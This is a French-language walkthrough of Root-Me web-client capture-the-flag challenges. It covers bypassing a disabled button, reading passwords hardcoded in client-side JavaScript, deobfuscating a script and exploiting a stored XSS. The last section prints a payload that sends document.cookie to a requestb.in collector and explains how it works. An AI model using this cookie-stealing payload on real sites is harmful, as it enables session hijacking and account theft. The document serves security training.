Dans ce type de challenge, la page HTML contient un formulaire avec un bouton marqué disabled. Cet attribut empêche l’utilisateur de cliquer et d’envoyer le formulaire directement.

Pour contourner cela, on utilise les outils de développement du navigateur (F12). Dans l’onglet Inspecteur, on repère le bouton et on supprime l’attribut disabled.

Le challenge consiste à analyser le fonctionnement d’une page web qui gère une authentification côté client.

En ouvrant la page et en lançant la console web (F12), on observe les requêtes réseau. Lors du rafraîchissement, la page charge un fichier JavaScript externe :

http://challenge01.root-me.org/web-client/ch9/login.js

En visitant directement cette URL, on peut consulter le contenu du script. Celui-ci contient une condition explicite :

if (pseudo=="4dm1n" && password=="sh.org")

Dans ce challenge, la page HTML appelle un fichier JavaScript externe qui contient la logique d’authentification. En ouvrant les outils de développement (F12) et en utilisant le débogueur ou l’onglet Sources, on peut observer le contenu du script chargé.

On y trouve une structure de type tableau :

javascript

TheLists[0] = "CACHÉ:HIDDEN";

...

var TheSplit = TheLists[i].split(":");

var TheUsername = TheSplit[0];

var ThePassword = TheSplit[1];

Le code montre que chaque entrée du tableau TheLists contient une paire username:password. La fonction découpe la chaîne avec split(":") pour séparer le nom d’utilisateur et le mot de passe.

Ainsi, en lisant directement le contenu du tableau, on récupère les identifiants nécessaires. Dans l’exemple, l’utilisateur est CACHÉ et le mot de passe est HIDDEN.

Dans ce challenge, l’authentification est gérée directement dans le code source de la page. En ouvrant le fichier HTML ou en inspectant le JavaScript chargé par la page, on tombe sur une condition explicite :

if ( pass == "123456azerty" )

Dans ce challenge, le code JavaScript chargé par la page est volontairement obfusqué afin de rendre sa lecture difficile. L’objectif est de retrouver la logique réelle du script pour identifier le mot de passe ou l’indice caché.

Dans ce cas, l’outil utilisé pour désobfusquer le code est ChatGPT. Le mot de passe apparaît alors directement dans la logique du code.

Dans ce challenge, on commence par tester la vulnérabilité avec une injection simple :

< script>alert (1)< /script >

Le pop‑up confirme que le site est vulnérable à une XSS stockée.

On peut ensuite injecter un script plus élaboré :

< script >

document.write('< imgsrc= "https://requestb.in/xxxxx?cookie=' + document.cookie + '">admin< /img >');

< /script >

Explication de la commande :

- < script > ... < /script > : balise qui permet d’exécuter du JavaScript directement dans la page.

- document.write(...) : insère dynamiquement du contenu HTML dans la page. Ici, on génère une balise < img >.

- < imgsrc="..." > : l’image n’a pas besoin d’exister, l’important est que le navigateur fasse une requête HTTP vers l’URL indiquée.

- https://requestb.in/xxxxx?cookie= : URL vers un service de collecte de requêtes. On y ajoute en paramètre la valeur des cookies.

- document.cookie : récupère les cookies de la page, souvent utilisés pour l’authentification.

- Résultat : lorsque la page est affichée, le navigateur envoie une requête vers requestb.in contenant les cookies de l’utilisateur.

J’ai utilisé le site requestbin afin d’éviter de build un serveur.
